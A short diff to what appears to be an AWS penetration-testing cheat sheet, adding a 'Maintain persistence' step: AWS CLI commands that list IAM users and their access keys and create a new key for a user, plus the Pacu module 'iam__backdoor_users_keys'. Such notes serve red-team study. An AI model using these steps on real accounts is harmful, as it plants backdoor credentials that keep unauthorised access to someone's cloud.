@@ -16,8 +16,13 @@ run aws__enum_spend
 ```
 
 ## Maintain persistence
+Identify user with 0 or 1 access key (need iam:CreateAccessKey)
 ```
-
+aws iam list-users --profile Test
+aws iam list-access-keys --user-name Sarah --profile Test
+aws iam create-access-key --user-name Sarah --profile Test
+# Or run PACU command
+run iam__backdoor_users_keys
 ```
 
 ## EC2
